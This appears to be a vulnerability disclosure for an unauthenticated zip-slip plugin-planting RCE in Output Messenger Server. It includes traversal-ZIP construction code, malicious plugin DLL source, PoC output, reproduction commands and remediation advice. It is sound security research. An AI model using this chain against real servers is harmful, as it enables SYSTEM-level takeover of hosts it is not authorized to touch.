# Output Messenger Server Unauthenticated Zip-Slip Plugin Planting RCE — Full Technical Analysis

## Product Background

- **Vendor**: Output Technology
- **Product**: Output Messenger Server 2.0.x (>= 2.0.63)
- **Category**: on-premise enterprise instant messaging
- **Stack**: .NET / XMPP control plane (TCP 14121) + SOCKS5 file listener (14135) + plugin architecture
- **Service**: `OutputMessengerServer` runs as **LocalSystem**
- **Zip library**: `ICSharpCode.SharpZipLib.dll` FileVersion=**0.85.4.369** (runtime-verified)

## Stage 0 — Prerequisites / Authentication Boundary

The XMPP control plane (14121) has **no SASL, no credentials**. `ASActions.ProcessAnonymousData` runs on every new connection:

```csharp
// ASActions.cs:31-38
uConnection.Authenticated = true;                 // ASActions.cs:32 — connection-level immediate auth
UnauthUser unauthUser = new UnauthUser();
unauthUser.setConnection((XmppConnection)uConnection);
UnauthUserCollection.Add(sessionId, unauthUser);
((XmppConnection)uConnection).PushStreamData(b);  // parsed as XMPP stream
```

`UnauthUser.OnStreamElement` (`UnauthUser.cs:39-44`) dispatches **every** parsed XMPP element to `HandlerStorage.GetInvokers(e.GetType())` — no type gate, no auth gate; Message/IQ/SI/Presence/Auth/Stream all reachable. `gASKEY` (server key) is `string.Empty` in default single-server mode, so `"".Equals("")` passes all "local user" checks.

**Conclusion**: an anonymous attacker can reach all XMPP handlers, including `MessageHandler` (cmd dispatch) and `SIHandler`/`RemoteASConnection` (file-transfer routing).

## Stage 1 — Sink Identification

The file-extraction sink is `SyncLog.ProcessSyncLog`:

```csharp
// SyncLog.cs:23-26
private void ProcessSyncLog(object sender, short cId, string lsUserFrom, string toUserKey, string fileName, string orgFileName) {
    if (!File.Exists(fileName)) return;            // SyncLog.cs:19 — attacker controls this via completed SOCKS5 transfer
    // ...
    fastZip.ExtractZip(filename, text, Overwrite.Always, null, string.Empty, string.Empty, restoreDateTime:true);
    //                     ^^^^^^^^                              ^^^^                ^^^^^^^^^^^^
    //               target dir C:\ProgramData\<zipname>\        fileFilter=null    dirFilter="" (no entry filter)
}
```

SharpZipLib 0.85.4.369 does **not** reject `..\` traversal entries (path sanitization was added only in 1.3.0, 2018), and `Overwrite.Always` overwrites existing files. Classic Zip-Slip sink. The service runs as **LocalSystem** → extraction writes with SYSTEM privileges.

## Stage 2 — Source Identification

Source = ZIP byte stream pushed by the attacker over the SOCKS5 FileListener (port 14135). ZIP entry names are fully attacker-controlled (`zipfile.writestr("..\\..\\...\\target.dll", payload)`). `..\` segments are concatenated into `Path.Combine(text, entry.Name)` during `ExtractZip`, traversing from the extraction root `C:\ProgramData\log\` up to `C:\`.

## Stage 3 — Data Flow (end-to-end chain)

```
[Anonymous attacker]
   │  ① TCP 14121 <stream:stream to='localhost'>
   │     → ASActions.ProcessAnonymousData → Authenticated=true → UnauthUser registered
   ▼
[XMPP Message cmd=3]  linkserver registration (no gASKEY check, any key accepted)
   │     → OtherProcess(cmd=LoginLinkserver) → Login_Linkserver(XUser cast OK)
   │     → server replies cmd=5 LoginLinkserverSuccess
   ▼
[SI IQ set]  offline=true synclog=true hash=MYHASH remoteserver2=true, to=nonexistent_JID
   │     → SIHandler → RemoteASConnection.ProcessData (no auth/key gate)
   │     → non-conference SI/ByteStream falls to gSSCon.SendToSS → SSActions.ProcessData
   │     → SSActions.OfflineFileRequest:
   │         • hash attr → FileCollection.Add(MYHASH, exFileRouter)  (keyed by MYHASH)
   │         • synclog attr → fileRouter.OfflineFileWritten += SyncLog.ProcessSyncLog  (SSActions.cs:1918)
   │         • fileRouter.FileName = Path.Combine(gOFFLINEPATH\Temp\<uid>\File, "<sid>@D@log.zip")
   │         • fileRouter.FileLength = file.Size  (attacker-declared ZIP size)
   ▼
[SOCKS5 CONNECT 14135 → MYHASH]  FileListener (SwitchingServerPort)
   │     → SSListener → SSActions.ProcessAnonymousData → ProcessConnection
   │     → attacker socket wired as FileRouter.FromUser (FileRouter.cs:200 setter subscribes SenderOnReceivedtoOffline)
   ▼
[push ZIP bytes]  FileRouter.SenderOnReceivedtoOffline (FileRouter.cs:732-759)
   │     • _fileStream = new FileStream(_fileName, FileMode.Create)
   │     • _fileStream.Write(b, 0, b.Length); _bytesTransmitted += b.Length
   │     • if (_bytesTransmitted >= _fileLength) { CloseTransfer(); OfflineFileWritten?.Invoke(...) }
   ▼
[OfflineFileWritten event] → SyncLog.ProcessSyncLog → FastZip.ExtractZip
   │     • extraction root text = Path.Combine(gCOMMON_APPLICATION_DATA, GetFileNameWithoutExtension("log.zip"))
   │                     = C:\ProgramData\log
   │     • entry "..\..\..\..\..\..\..\..\Program Files\Output Messenger Server\Plugins\Mail\OM.EvilMail.dll"
   │       8 ".." traverse from C:\ProgramData\log to C:\
   │     → writes C:\Program Files\Output Messenger Server\Plugins\Mail\OM.EvilMail.dll (NEW file, not locked by running service)
   ▼
[service restart]  net stop / net start (or reboot / update)
   │     → PluginServices.ReadPlugins: Assembly.LoadFrom iterates all .dll in Plugins\* subdirs
   │     → ExamineAssembly records public types implementing the plugin interface
   │     → PluginAction.BindPlugins: foreach (ALL discovered plugins)
   │           if (IsPluginEnabled(plugin))  ← PluginAction.cs:214
   ▼
[IsPluginEnabled]  PluginAction.cs:276-299
   │     • CreateInstance(pInfo.AssemblyPath, pInfo.IInformationClassName) as IPluginInformation
   │       ↑ line 282 — fires parameterized .ctor BEFORE the enabled-DB query
   │     • only then queries _enabledPlugins.Where(p => p.Title == pluginInformation.Title)
   │     • even if the plugin is not enabled, the .ctor has already fired
   ▼
[EvilMail .ctor]  runs as NT AUTHORITY\SYSTEM
       File.WriteAllText(@"C:\Windows\Temp\om-rce-exec-proof.txt",
           "UNAUTH-RCE-SYSTEM-PROOF " + WindowsIdentity.GetCurrent().Name + " tick=" + Environment.TickCount);
```

## Stage 4 — Injection / Exploitation Construction

**Malicious ZIP construction** (key: marker first, DLL second):

```python
DLL_REL  = "\\".join([".."]*8) + "\\Program Files\\Output Messenger Server\\Plugins\\Mail\\OM.EvilMail.dll"
MARKER_REL = "\\".join([".."]*8) + "\\Windows\\Temp\\om-zipslip-marker.txt"
zf.writestr(MARKER_REL, MARKER_CONTENT)   # marker FIRST — proves ExtractZip fired
zf.writestr(DLL_REL, EVIL_BYTES)          # evil DLL second
```

**Why plant `OM.EvilMail.dll` (new file) instead of overwriting `OM.Mail.dll` (already loaded)**: `OM.Mail.dll` is loaded by the running service → Windows locks the file → `ExtractZip` writing it throws → the whole extraction aborts. `OM.EvilMail.dll` is a **new file** (not locked) → clean write. Marker is the first entry, so even if the DLL entry fails, the marker proves `ExtractZip` fired.

**Malicious DLL** (C# .NET Framework 4.8 library, 5120 bytes):

```csharp
namespace EvilNS {
    public class EvilMail : IPluginInformation {
        public EvilMail() {  // parameterized .ctor — triggered by IsPluginEnabled→CreateInstance
            try {
                string id = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                System.IO.File.WriteAllText(@"C:\Windows\Temp\om-rce-exec-proof.txt",
                    "UNAUTH-RCE-SYSTEM-PROOF " + id + " tick=" + Environment.TickCount);
            } catch (Exception) {}
        }
        // IPluginInformation interface members (Title/Description/URL/Logo/...) omitted
    }
}
```

Compile: `csc /target:library /reference:OM.Plugin.dll /reference:System.Drawing.dll evil.cs`

## Stage 5 — Dynamic Verification

Environment: Windows Server 2025, Output Messenger Server 2.0.x, service as LocalSystem, bound 0.0.0.0:14121 (XMPP) + 0.0.0.0:14135 (SOCKS5).

Steps:
1. Stop service → clean `OM.EvilMail.dll`/marker/proof → start service → wait 75s for all ports
2. Run `python exploit.py 127.0.0.1 14121 14135` (single attempt, clean service state)

PoC stdout:
```
[*] evil plugin DLL: 5120 bytes
[*] built malicious zip size=2457 (marker + evil DLL)
[+] linkserver registration succeeded (cmd=5 LoginLinkserverSuccess)
[+] SI IQ sent (hash=omz_q32zs4ret4, synclog=true) -> OfflineFileRequest stored FileRouter keyed by MYHASH
[+] socks CONNECT accepted (rep=0) -> ProcessConnection wired attacker as FromUser
[*] pushing 2457 zip bytes...
[+] DLL PLANTED (unauth Zip-Slip as LocalSystem):
[+]   C:\Program Files\Output Messenger Server\Plugins\Mail\OM.EvilMail.dll
[+] Marker written (proves ExtractZip fired):
[+]   C:\Windows\Temp\om-zipslip-marker.txt = UNAUTH-ZIPSILP-SYSTEM-WRITE-PROOF <tick>
```

Plant confirmed (before restart): `OM.EvilMail.dll` exists (5120 bytes); marker exists; proof file **does not** exist (no execution before restart).

Trigger: `net stop OutputMessengerServer && net start OutputMessengerServer`, wait 30s for plugin load.

**SYSTEM RCE evidence**:
```
type C:\Windows\Temp\om-rce-exec-proof.txt
UNAUTH-RCE-SYSTEM-PROOF NT AUTHORITY\SYSTEM tick=231638250
```
→ **`NT AUTHORITY\SYSTEM` code execution confirmed**. Original `OM.Mail.dll` (12288 bytes) untouched.

## Stage 6 — Reachability

- **Auth**: whole chain requires **no authentication**. `ProcessAnonymousData` sets `Authenticated=true` on connection establishment; no SASL. linkserver registration (cmd=3) accepts any key (no gASKEY check). SI IQ and SOCKS5 FileListener have no credential gates
- **Network**: 14121 + 14135 bind `0.0.0.0` by default (remote-reachable). Default `om_ip_range` "Other Networks" flag=A (allowed), no IP restriction
- **Default config**: all conditions satisfied in a default install — empty gASKEY, SharpZipLib 0.85.4, LocalSystem service, IP range fully allowed
- **Trigger**: requires a service restart (plant-and-restart pattern). Service START_TYPE=AUTO_START, no auto-restart on failure (RESET_PERIOD=0), so restart is an ops event (reboot/admin action/update), not attacker-forced. Standard plant-and-restart RCE, still a valid unauthenticated RCE

## Stage 7 — Defense in Depth / Remediation

1. **XMPP control plane**: require SASL/credentials before setting `Authenticated=true`; linkserver registration must validate gASKEY
2. **Upgrade SharpZipLib** to >= 1.3.0, or set a `NameTransform`/`PathFilter` on `ExtractZip` to reject `..\`
3. **Pre-extraction entry validation**: reject entries containing `..`, or restrict the extraction root + reject out-of-root writes
4. **Plugin loading isolation**: `BindPlugins`/`IsPluginEnabled` must not `CreateInstance` before the enabled-DB query; check enabled state first
5. **Service privilege**: `OutputMessengerServer` should not run as LocalSystem; use a least-privilege service account
6. **Authenticate the file listener**: the SOCKS5 FileListener (14135) should verify the source user, not accept anonymous CONNECT

## Adversarial Verification

Two independent subagents ruled **CHAIN HOLDS**:
- Independent re-audit: 10 confirmations with file:line evidence
- Falsification agent: all 10 falsification tasks A-J failed; the only partial correction = port 14121 uses TLS in some configs (server-side only, no client certificate), anonymous reachability confirmed; chain unbroken

## Reproduction

```bash
# target Windows (Python 3.12, stdlib only)
python3 exploit.py 127.0.0.1 14121 14135
net stop OutputMessengerServer && net start OutputMessengerServer
type C:\Windows\Temp\om-rce-exec-proof.txt
# expected: UNAUTH-RCE-SYSTEM-PROOF NT AUTHORITY\SYSTEM tick=<N>
```

For authorized security research / responsible disclosure only.

## CWE / CVSS

- CWE-306 (Missing Authentication) — anonymous XMPP/SOCKS5
- CWE-22 (Path Traversal) — Zip-Slip via old SharpZipLib
- CWE-434 (Unrestricted Upload) — arbitrary plugin DLL planting
- CWE-94 (Code Injection) — plugin .ctor execution
- **CVSS 3.1**: ≈ 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — PR:N because the entire chain is unauthenticated
